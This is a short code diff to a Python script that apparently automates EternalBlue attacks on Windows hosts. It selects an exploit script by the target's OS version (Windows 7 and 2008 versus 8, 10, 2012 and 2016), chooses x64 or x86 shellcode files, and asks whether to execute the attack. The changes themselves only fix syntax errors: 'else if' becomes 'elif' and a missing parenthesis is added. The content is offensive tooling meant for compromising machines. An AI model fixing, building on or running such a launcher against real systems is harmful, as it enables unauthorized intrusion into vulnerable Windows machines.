@@ -78,7 +78,7 @@ def execVuln(target):
 	if os in ["Microsoft Windows 2012", "Microsoft Windows 2016", "Microsoft Windows 10", "Microsoft Windows 8", "Microsoft Windows 8.1"]:
 		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit10.py"])
 		script = "eternalblue_exploit10.py"
-	else if os in ["Microsoft Windows 7", "Microsoft Windows 2008"]:
+	elif os in ["Microsoft Windows 7", "Microsoft Windows 2008"]:
 		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit7.py"])
 		script = "eternalblue_exploit7.py"
 	else:
@@ -89,10 +89,10 @@ def execVuln(target):
 	y = input()
 	if y in ["64", "64bit", "64Bit", "64BIT", "64 bit", "64 Bit", "64 BIT", ""]:
 		shellcode = "shellcode/sc_x64.bin"
-	else if y in ["32", "32bit", "32Bit", "32BIT", "32 bit", "32 Bit", "32 BIT"]:
+	elif y in ["32", "32bit", "32Bit", "32BIT", "32 bit", "32 Bit", "32 BIT"]:
 		shellcode = "shellcode/sc_x86.bin"
 	else:
-		print("Please insert a valid option"
+		print("Please insert a valid option")
 		exit()
 
 	print("Everything ready, would you like to execute the attack? [Y/n]")
